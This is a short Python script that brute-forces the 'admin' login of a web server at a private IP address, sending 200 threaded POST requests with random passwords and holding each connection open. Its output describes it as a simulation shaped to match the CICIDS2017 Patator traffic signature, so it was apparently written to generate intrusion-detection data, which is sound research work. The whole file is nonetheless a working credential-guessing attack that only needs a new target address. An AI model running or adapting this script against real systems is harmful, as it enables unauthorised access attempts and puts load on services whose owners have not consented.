import http.client
import random
import string
import threading
import time

TARGET_IP    = "172.30.67.248"
TARGET_PORT  = 80
PATH         = "/login"

ATTEMPTS     = 200    
WORKERS      = 10     
HOLD_SECONDS = 5.0   


def random_password(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def send_attempt(attempt_id: int, results: list) -> None:
    password = random_password()
    body     = f"username=admin&password={password}".encode()

    conn = http.client.HTTPConnection(TARGET_IP, TARGET_PORT, timeout=10)
    status = 0
    try:
        conn.request(
            "POST", PATH, body=body,
            headers={
                "Content-Type":   "application/x-www-form-urlencoded",
                "Content-Length": str(len(body)),
                "Connection":     "keep-alive",
            },
        )
        resp = conn.getresponse()
        resp.read()          
        status = resp.status

        time.sleep(HOLD_SECONDS)

    except Exception as exc:
        print(f"  [{attempt_id}] connection error: {exc}")
    finally:
        conn.close()

    results.append((attempt_id, status, password))


def main() -> None:
    print(f"Brute-force simulation → http://{TARGET_IP}:{TARGET_PORT}{PATH}")
    print(f"Attempts: {ATTEMPTS} | Workers: {WORKERS} | Hold: {HOLD_SECONDS}s/conn")
    print("(Each connection held open to match CICIDS2017 Patator flow signature)\n")

    results:   list = []
    semaphore  = threading.Semaphore(WORKERS)

    def worker(aid: int) -> None:
        with semaphore:
            send_attempt(aid, results)

    threads = [threading.Thread(target=worker, args=(i,), daemon=True)
               for i in range(1, ATTEMPTS + 1)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    ok     = sum(1 for _, s, _ in results if s == 200)
    fail   = sum(1 for _, s, _ in results if s == 401)
    errors = sum(1 for _, s, _ in results if s == 0)
    print(f"\nDone — success: {ok} | failed: {fail} | errors: {errors}")


if __name__ == "__main__":
    main()
